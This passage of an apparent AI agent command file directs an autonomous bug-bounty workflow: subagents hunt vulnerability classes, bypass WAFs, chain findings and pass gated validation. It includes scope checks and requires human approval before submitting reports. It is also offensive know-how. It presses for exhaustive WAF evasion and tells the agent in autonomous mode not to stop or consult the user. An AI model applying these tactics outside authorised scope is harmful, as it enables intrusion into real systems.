    For the dispatched class:
    a. **Writeup intelligence (ENFORCED — do this before EVERY hunter dispatch):**
       - Call `search_techniques` MCP tool for the vuln class
       - Call `search_payloads` MCP tool for the vuln class
       - If MCP unavailable, read `rules/payloads.md` as fallback
       - Include results in the hunter prompt
    b. **WAF-aware hunter prompt (ENFORCED when WAF detected on target):**
       Include in every hunter dispatch for WAF-protected targets:
       ```
       WAF DETECTED: <waf_name> on this target.
       Read `rules/waf-bypass-protocol.md` AND `rules/payloads.md` (WAF bypass
       sections). Work through ALL 7 bypass levels systematically — ≥3 payloads
       per level before moving to the next. Do NOT give up after 3-5 generic
       payloads; that is the starting condition for the protocol, not the end.
       Combine levels when one gets through partially (L1 encoding + L2 tag,
       L2 tag + L4 keyword obfuscation, etc.).
       Time box: 20 minutes on WAF bypass per endpoint.
       Record per-level results in your output: which bypasses got blocked, which
       got through, and what the response differentials looked like.

       Never-valid verdicts (your output will be rejected if it contains these):
       - "WAF blocks <payload>" without a level-by-level record
       - "not vulnerable — WAF blocks attempts"
       - "curl returns 403 so the endpoint is not vulnerable"
       ```
    c. Dispatch specialized hunter agent (model: inherit) with:
       - Policy preamble
       - Writeup intelligence (techniques + payloads)
       - **Variant matrix** (from Depth Engine step 1) + explicit requirement:
         "Do NOT stop at single-vector probes. Exhaust the matrix including
         combinations. Minimum 25 distinct attempts before any 'exhausted'
         verdict unless a policy/scope/WAF block is proven."
       - WAF context (type + bypass instructions if applicable)
       - Brain context (tested vectors, tech stack, known endpoints)
       - Scope boundaries
       - If `--20m-off` NOT set: "Time-box: 20 minutes. If no progress after 20 min, stop and report what you tested."
       - **Chain-anchor preamble** (MANDATORY for feeder vuln-classes):
         If the dispatched class is in the feeder list — `open-redirect`,
         `cors`, `info-disclosure`, `csrf`, `subdomain-takeover`, `xxe`,
         `file-upload`, `race-condition`, `business-logic`,
         `privilege-escalation` — extract that class's anchors from
         `rules/chain-table.md` "Per-Class Chain Anchors" section and
         prepend this directive verbatim to the agent prompt:
         ```
         CHAIN-ANCHOR DIRECTIVE — this finding class sells low/N-A standalone.
         After confirming the bug, you MUST probe these chain anchors before
         declaring the finding complete:
         [paste the 3-5 anchors for the class from chain-table.md]
         If any anchor returns signal → label finding CHAIN-CANDIDATE in brain
         and STOP. Do not write a single-bug report. Autopilot will dispatch
         chain-builder. If all anchors fail → finding is informational; apply
         rules/never-submit.md. The chain is the report.
         ```
    d. After hunter returns:
       - Parse output for findings, tested endpoints, exhausted techniques,
         AND matrix coverage percentage. Reject shallow results:
         <25 attempts, <3 encoding-ladder steps, or missing differential
         evidence → re-dispatch same class with stricter instructions.
       - Run exhaustion gate before honoring any "exhausted" verdict:
         ```bash
         uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py exhaustion-gate \
           --attempts <count> \
           --combos-tested <count> \
           --combos-remaining <count> \
           --encoding-steps <count> \
           --differential-evidence
         ```
         If this command fails, do NOT mark exhausted — re-dispatch deeper.
       - If hunter signals a DIFFERENT vuln class → adaptive re-search:
         Call `search_techniques` + `search_payloads` for the new class →
         dispatch appropriate specialized hunter with new intelligence
       - Brain update for findings/exhausted entries: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> <status> "<technique>" "<details>"`
       - Coverage update — use the structured writer, NOT bare brain.py:
         ```bash
         uv run python3 $CLAUDE_PROJECT_DIR/tools/coverage_record.py \
           --host <host> --class <class> [dispatched flags OR --surface-status ...] \
           --evidence evidence/<host>/coverage/<class>-attempts.jsonl
         ```
         Refusal from coverage_record.py = stay in the loop, deepen the matrix.
       - If hunter reports WAF bypass results: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> waf-bypass "<level: result pairs>" "<bypass details>"`
       - If a "potential" finding surfaces, dispatch a second-opinion
         specialist (dast-devils-advocate, or a sibling hunter) BEFORE
         advancing to the FINDING PIPELINE.
       - Record telemetry for reprioritization:
         ```bash
         uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py record-outcome \
           --vuln-class "<class>" \
           --result "<confirmed|killed|downgraded|partial>" \
           --attempts <count> \
           --elapsed-minutes <minutes> \
           --telemetry-path .autonomy-telemetry.json
         ```
       - Increment subagent counter

23. **CHAIN-PRESSURE CHECK (every subagent completion):**
    The chain_pressure_hook.py SubagentStop hook scans findings.json
    after every agent run and writes
    `.claude/agent-memory-local/chain-pending.md` if any feeder
    findings (open-redirect, CORS, info-disclosure, CSRF,
    subdomain-takeover, XXE, file-upload, race-condition,
    business-logic, privilege-escalation) are confirmed without a
    chain.

    On each loop iteration:
    a. `cat .claude/agent-memory-local/chain-pending.md 2>/dev/null` —
       check if pending list is non-empty.
    b. **Refresh chain plan** if list non-empty:
       ```bash
       uv run python3 $CLAUDE_PROJECT_DIR/tools/chain_plan.py <target>
       ```
       Writes `evidence/<target>/CHAIN_PLAN.md` with 3-5 candidate
       next-links per feeder finding plus the agent to dispatch for
       each. Read before deciding what to chain.
    c. Mode-specific behavior:
       - `--paranoid`: dispatch `chain-builder` for EVERY pending
         entry before continuing the hunt loop. Block until chains
         resolved or 20-min time-box expires. Use the chain plan
         entries as the dispatch order (highest-CVSS feeder first).
       - `--normal` (default): dispatch `chain-builder` for top
         pending entry between hunter dispatches. Don't block the
         loop; process one at a time. Plan entries inform which
         agent to invoke as link 2.
       - `--yolo`: skip auto-dispatch. Pending list + plan are
         advisory only.
    d. After chain-builder runs, the hook re-runs and updates
       chain-pending.md; chain_plan refresh on next iteration drops
       resolved entries because they now have chain markers in
       findings.json.

24. **FLUSH CYCLE (every 3 subagent completions):**
    a. Full brain update — ensure all findings, endpoints, tech stack saved
    b. `uv run python3 $CLAUDE_PROJECT_DIR/tools/global_brain.py sync-from-local`
    c. Refresh local autonomous surface ranking:
       ```bash
       uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py rank-surface \
         --endpoints-file recon/endpoints.txt \
         --tech-stack "<latest stack context>" \
         --output ATTACK_SURFACE_RANKING.md
       ```
    d. Re-dispatch `recon-ranker` agent (model: inherit) to re-rank surface
       (priorities shift as brain learns what's exhausted and what's confirmed)
    e. Refresh class hypotheses with latest telemetry:
       ```bash
       uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py classes \
         --tech-stack "<latest stack context>" \
         --target <target> \
         --telemetry-path .autonomy-telemetry.json \
         --output CLASS_HYPOTHESES.md
       ```
    f. Context checkpoint — check context usage:
       - If > 60%: save full state to brain, print progress summary,
         tell user: "Context at X%. Run `/autopilot --resume` to continue in fresh context."
         Then STOP.

## FINDING PIPELINE (when hunter reports a potential finding)

24. **Gate 1: Validator — 7-Question Gate**
    Dispatch `validator` agent (model: inherit) with finding details.

    - If **KILL** → brain update with reason, skip to next hunter. Done.
    - If **CHAIN REQUIRED** → dispatch `chain-builder` first, re-validate if chain found, else brain update as exhausted. Done.
    - If **DOWNGRADE** → note adjusted severity, continue pipeline at lower severity.
    - If **PASS** → continue to Gate 2.

25. **Gate 2: Browser Verification (MANDATORY for client-side findings)**

    Classify the finding's vuln class:
    - **Client-side** (requires browser verification): XSS-reflected, XSS-stored, XSS-DOM, prototype pollution, postMessage, DOM clobbering, CSS injection with JS impact, open redirect with token in URL
    - **Server-side** (skip to Gate 3): IDOR, SSRF, SQLi, auth bypass, race condition, file upload RCE, command injection

    If client-side:
    a. Ensure camofox is running: `$CLAUDE_PROJECT_DIR/tools/camofox_ctl.sh status || $CLAUDE_PROJECT_DIR/tools/camofox_ctl.sh start`
    b. Dispatch `browser-verifier` agent (model: inherit) with:
       - The finding (including PoC URL/curl command)
       - Policy preamble
       - Target's WAF type (so verifier knows to use camofox)
       - Instruction: "Verify this payload executes in a real browser. Use DOM markers, not alert(). Diagnose failures."
    c. Parse verdict:
       - **BROWSER_CONFIRMED** → continue to Gate 3
       - **BROWSER_REJECTED** → brain update: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> browser-rejected "<finding>" "<reason: CSP/framework/context>"`
         Log the rejection reason. DO NOT proceed to report. Move on.
       - **BROWSER_PARTIAL** → apply the verifier's severity adjustment, continue to Gate 3

    **A client-side finding that skips browser verification MUST NOT reach /report.
    This is non-negotiable. Curl reflection alone is not XSS.**

26. **Gate 3: Devil's Advocate — Adversarial Severity Check**

    Dispatch `dast-devils-advocate` agent (model: inherit) with:
    - The finding (with browser verification results if applicable)
    - Policy preamble
    - Target's hacktivity context (known reports)
    - Instruction: "Attempt to disprove this finding. Check: is data actually public? Does impact match the claim? Is severity justified by evidence?"

    Parse verdict:
    - **SURVIVES** → continue to reporting at the assessed severity
    - **DOWNGRADE** → update severity to devil's advocate's assessment, continue to reporting
    - **KILLED** → brain update: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> da-killed "<finding>" "<reason>"`
      Log: "Devil's advocate killed: [reason]". Move on.
    - **BLOCK** → missing verification. Should not happen if Gates 1-2 ran correctly.
      If it does: dispatch the missing verifier, then re-run Gate 3.

27. **Reporting Pipeline (finding survived all gates)**

    a. Build autonomous chain plan first:
       ```bash
       uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py chain-plan \
         --capability-file .claude/agent-memory-local/brain/patterns/capability-graph.json \
         --output CHAIN_PLAN.md
       ```
    b. Dispatch `chain-builder` agent (model: inherit) with:
       - Confirmed finding at FINAL severity (after all adjustments)
       - `rules/chain-table.md` content
       - Policy preamble
       - Brain context
    c. Run `/dupcheck` logic: search hacktivity via bounty-platforms MCP
       - If likely duplicate → brain update, skip reporting, move on
    d. Dispatch `poc-builder` agent (model: inherit) with:
       - Include in prompt: "You MUST run `uv run python3 $CLAUDE_PROJECT_DIR/tools/capture.py screenshot` and `uv run python3 $CLAUDE_PROJECT_DIR/tools/capture.py record` as part of every PoC. Evidence is not optional."
       - For CF-protected targets: "Use camofox for screenshots. Challenge pages are not evidence."
       - If browser-verifier already captured screenshots, reference those: "Browser verification screenshots exist at [paths]. Build on these, don't duplicate."
    e. Dispatch `report-writer` agent (model: inherit) with:
       - FINAL severity (post-devil's-advocate adjustment)
       - All evidence paths (verified with `ls`)
       - Browser verification results (if client-side)
       - Devil's advocate assessment (include severity justification)
    f. Dispatch `quality-check` agent (model: inherit) — must score >= 7
       - Quality check must verify:
         - Severity matches devil's advocate assessment (not the original hunter claim)
         - Client-side findings include browser verification evidence
         - PoC is reproducible (not just described)
         - CVSS vector matches the ACTUAL impact (not theoretical)
    g. Run evidence sufficiency score before finalizing report:
       ```bash
       uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py evidence-score \
         --has-http-pair \
         --has-readback \
         --reliability-runs <n> \
         --reliability-hits <n> \
         --has-harm-artifact \
         --chain-depth <n>
       ```
       If result is DOWNGRADE/KILL, adjust severity or drop the report.
    h. Brain update: confirmed finding with report path
       `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> confirmed "<finding>" "<report path, severity, gates passed>"`
       `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py capability <target> "<capability gained>" --source "<finding id>" --confidence 0.9 --details "<proof>"`

    i. If `--interactive` mode: pause here, show finding + gate results to user:
       ```
       FINDING: [title]
       Severity: [original] → [final after gates]
       Validator:    PASS
       Browser:      [CONFIRMED/N/A]
       Devil's Adv:  [SURVIVES/DOWNGRADE from X to Y]
       Quality:      [score]/10
       Report:       reports/drafts/[filename]

       [Submit / Skip / Edit]
       ```

28. After all vuln classes tested on target:
    `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> exhausted "all classes tested" "<final coverage summary>"`
29. Next P1 target → back to step 17

## PRE-COMPLETION GATE (mandatory; blocks COMPLETION until ALL pass)

Before the COMPLETION section runs, run the hard gate tool. This is the
source of truth; do not replace it with an inline shell approximation.

```bash
uv run python3 $CLAUDE_PROJECT_DIR/tools/autopilot_gate.py \
  --target "<original /autopilot target argument>" \
  --mode "<interactive|autonomous>"
```

The gate fails closed when any of these are true:

- Any discovered live host in `recon/live-hosts.txt` is not explicitly ranked P1/P2/Kill.
- Any P1 target lacks a brain target file.
- Any P1 target is missing surface probe artifacts for A, B, C, D, E, F, G, or I. Probe H is also required when Cloudflare evidence exists.
- Any canonical hunter class lacks either `coverage-<class>` or a valid `not-applicable: <class>` entry.
- A dispatched class records fewer than 25 explicit attempts, missing differential evidence, missing `variants_tried` / `dimensions_covered` / `exact_blocker`, or nonzero remaining combinations.
- A surface-driven class records `signal:` without `candidate-dispatched:<hunter>`.
- A `not-applicable` entry is generic, does not cite surface evidence, or contradicts the method matrix.
- Exhaustion is claimed through an auxiliary agent (`js-analyzer`, `config-auditor`, `waf-profiler`, `sast-*`, `cloud-recon`, `vuln-scanner`).
- Autonomous wall-clock or subagent floors are not met.
- `chain-pending.md` is non-empty.
- Confirmed findings lack validator, browser-verifier when client-side, or devil's-advocate markers.

If any gate fails, the orchestrator MUST:

1. Identify the specific failing assertion
2. Return to HUNT LOOP (step 17) for the failing target/class
3. Re-run the gates after closing the gap
4. **Only print COMPLETION SUMMARY when every gate passes**
5. **Do NOT ask the user whether to continue — `--autonomous` means continue**

Repeat-failure cap: if the same gate fails 3 times in a row on the same
class, dispatch `dast-devils-advocate` to confirm the gap is real (not a
brain query error), then either close it or document why the class is
truly not-applicable with technical justification from the surface probe.

### Adversarial Exhaustion Review (mandatory after the hard gate passes)

A hard-gate PASS means "no failures the gate is built to detect." It is
NOT proof of exhaustion. Before printing COMPLETION, dispatch
`dast-devils-advocate` (model: inherit) with the following prompt:

```
subtype: exhaustion
target: <original /autopilot target>
gate_log: <path to autopilot_gate.py PASS output you just produced>
live_hosts: recon/live-hosts.txt
ranking: ATTACK_SURFACE_RANKING.md
brain_targets: .claude/agent-memory-local/brain/targets/
evidence_root: evidence/
recon_depth: recon/dns-bruteforce.txt, recon/urlscan-cdx.json, recon/github-code.json, recon/public-archives.txt, recon/mobile/

Apply the "Exhaustion Adversarial Review" section in your agent file.
Default stance: there IS a gap. Find one or output NO_GAPS_FOUND.
```

Then parse the output:

- If output contains `FOUND_GAPS:` → completion is forbidden. For each
  gap, return to the HUNT LOOP for the listed host/class with the
  remediation as the next directive. Re-run the hard gate when each gap
  is closed. After all gaps close, dispatch the adversarial reviewer
  again — never trust "I fixed all the gaps" without a re-review.
- If output is exactly `NO_GAPS_FOUND` → run the hard gate one more
  time (defense in depth: the reviewer might have triggered new brain
  writes). If that final hard-gate run also passes, proceed to
  COMPLETION.

Output that doesn't end in either `FOUND_GAPS:` or `NO_GAPS_FOUND` is
malformed — re-dispatch the reviewer with explicit "respond in the
required format" instruction.

After the gate passes AND the adversarial reviewer returns
`NO_GAPS_FOUND` AND the final hard-gate re-run passes, append the final
coverage matrix to brain:

```bash
uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> coverage-final \
  "<class:status pairs for all 26 classes>" "<gate pass timestamp>"
```

## COMPLETION

30. Stop camofox if running: `$CLAUDE_PROJECT_DIR/tools/camofox_ctl.sh stop`
31. Final brain sync: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py log` + `uv run python3 $CLAUDE_PROJECT_DIR/tools/global_brain.py sync-from-local`
32. Final surface re-rank: dispatch `recon-ranker` agent to show remaining surface
33. Print summary:
    ```
    AUTOPILOT SESSION COMPLETE
    ══════════════════════════

    Mode:             [interactive/autonomous]
    Targets tested:   N exhausted, M remaining
    WAF detected:     [CF: X hosts, Akamai: Y hosts, none: Z hosts]
    Camofox used:     [yes/no]

    Finding Pipeline:
      Raw findings:          X
      Validator PASS:        Y
      Browser verified:      A confirmed, B rejected, C partial
      Devil's advocate:      D survived, E downgraded, F killed
      Reports ready:         R at reports/drafts/

    Hallucinations caught:
      Browser rejected:      B (would have been false XSS reports)
      Devil's advocate killed: F (would have been N/A or overestimated)
      Estimated time saved:  ~[B+F] × 30 min = [hours] hours

    Chains:          C discovered

    Next steps:
      /submit <finding>    — submit a report (requires your approval)
      /autopilot --resume  — continue with remaining targets
      /status              — full dashboard
    ```

## Safety Rails (NON-NEGOTIABLE)

- Scope check EVERY URL with `uv run python3 $CLAUDE_PROJECT_DIR/tools/scope_check.py <url>` before any request
- NEVER submit a report without explicit human approval
- NEVER auto-submit in `--autonomous` mode — only produce reports
- Circuit breaker: 5 consecutive 403/429 on same host → back off 60s, rotate to a different endpoint. Do NOT skip the host outright on WAF 403 — that is a bypass problem, not a vuln verdict. See `rules/waf-bypass-protocol.md`.
- Rate limit: 1 req/sec for testing, 10 req/sec for recon
- All agents dispatched with `model: "inherit"` — never inherit Opus
- Client-side findings MUST pass browser verification — no exceptions
- ALL findings MUST pass devil's advocate — no exceptions
- Camofox cleanup: always stop on session end unless `--resume` expected
- **EXHAUSTION CONTRACT and PRE-COMPLETION GATE are NON-NEGOTIABLE.** `--autonomous` mode is INSATIABLE: do not stop, do not ask the user, do not skip surface probes, do not substitute auxiliary agents for hunters, do not print COMPLETION until the gate passes.
- Banned tools (this workspace): `nuclei`, `ugrep`. Never include them in any agent prompt; the surface probe uses `httpx`/`ffuf`/`dirsearch`/`curl` instead.

## Top-Tier Control Loop

Autopilot is not "run every agent until something happens." It is a controlled experiment loop.

1. Every dispatch needs four fields: objective, budget, abort condition, and required artifact. Reject agent output that does not answer all four.
2. Keep a live queue with `P1`, `P2`, `blocked`, `chain-pending`, and `killed`. Re-rank after every confirmed capability, major block, or new recon artifact.
3. Do not count activity as progress. Progress is one of: new reachable surface, disproved hypothesis, confirmed capability, validated chain, report-ready evidence.
4. Promote a finding only when the proof artifact matches the claimed impact. Reflection is not XSS, a 403 bypass is not authorization failure, a leaked URL is not sensitive data.
5. Spend budget asymmetrically. Double down on endpoints that expose state transitions, tenant boundaries, billing, admin delegation, file ingestion, OAuth callbacks, or AI/tool execution.
6. Stop cleanly: checkpoint the queue, coverage matrix, pending chains, cost, and exact next command. A resumed session should not need to rediscover context.
